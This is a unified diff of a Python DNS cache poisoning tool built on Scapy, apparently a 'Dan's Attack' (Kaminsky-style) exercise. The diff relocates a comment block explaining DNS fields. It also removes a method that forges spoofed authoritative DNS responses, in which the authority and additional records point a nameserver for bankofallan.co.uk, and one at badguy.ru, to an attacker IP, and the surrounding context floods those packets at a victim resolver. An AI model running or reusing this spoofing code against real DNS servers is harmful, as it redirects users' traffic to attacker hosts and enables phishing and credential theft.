@@ -227,6 +227,18 @@ class DNSPoisoning:
 
         return crafted_response
 
+
+
+    #Scapy field explaination
+    #qr = Response Flag
+    #rd = Recursion Desidered
+    #ra = 
+    #aa = Authoritative response
+    #nscount = number of NS 
+    #arcount = number of authoritative response
+    #qdcount = number of question
+    #ancount = number of answer
+
     ##
     #   @brief Return the crafted response used in "Dan's Attack"
     #   @param ID int Specify the ID to use
@@ -325,84 +337,6 @@ class DNSPoisoning:
         self.log("Start flooding")
 
         sendp(pkts, verbose=1, iface=nic_interface)
-
-
-    ##  Send crafted packet
-    #
-    #
-    #   A valid DNS response should respect the following params:
-    #   - Response should use the same destination port that the victim server used
-    #   - Question should match the query section
-    #   - Query ID should match
-    #
-    # Use Default DNS port as default source port    
-    #
-    # DNS Crafter response:  
-    #   - ID
-    #   - Authoritative
-    #   - Question
-    #       * Invalid Domain
-    #   - Source Port 
-    #   - Authoritative Reponse
-    #       * ns.bankofallan.co.uk
-    #   - Additional RR
-    #       - ns.bankofallan.co.uk -> attacker_ip
-    #       - bankofallan.co.uk -> attacker_ip
-    #
-    #    @todo: Check if recursion available
-    #
-
-    def send_crafted_packet(self, id_req):
-            
-        #Scapy field explaination
-        #qr = Response Flag
-        #rd = Recursion Desidered
-        #ra = 
-        #aa = Authoritative response
-        #nscount = number of NS 
-        #arcount = number of authoritative response
-        #qdcount = number of question
-        #ancount = number of answer
-
-        ID = id_req % 65535
-
-
-        crafted_response_1 = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
-            /UDP(dport=53, sport=53)\
-                /DNS(id=ID,\
-                    qr=1,\
-                    #rd=1,\
-                    ra=1,\
-                    aa=1,\
-                    #nscount=1,\
-                    #arcount=1,\
-                    #ancount=1,\
-                    #qdcount=1,\
-                    qd=DNSQR(qname=self.random_url, qtype="A", qclass='IN'),\
-                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
-                    ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=70000, rdata='ns.' + self.spoofed_domain + '.')\
-                )
-
-        #Second type of attack
-        crafted_response_2 = IP(dst=self.victim_server, src=self.auth_nameserver)\
-            /UDP(dport=53, sport=53)\
-                /DNS(id=id_req,\
-                    qr=1,\
-                    aa=1,\
-                    ra=0,\
-                    rd=0,\
-                    nscount=1,\
-                    arcount=1,\
-                    ancount=0,\
-                    qdcount=1,\
-                    qd=DNSQR(qname=self.random_url, qtype="A"),\
-                    an=None,\
-                    ns=DNSRR(rrname=self.random_url ,type='NS', rclass=1, ttl=70000, rdata="ns.badguy.ru"),\
-                    ar=(DNSRR(rrname='ns.badguy.ru', type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip))
-                )
-
-        self.flood_socket.send(crafted_response_1)
-
 
 
     ## Start Flooding
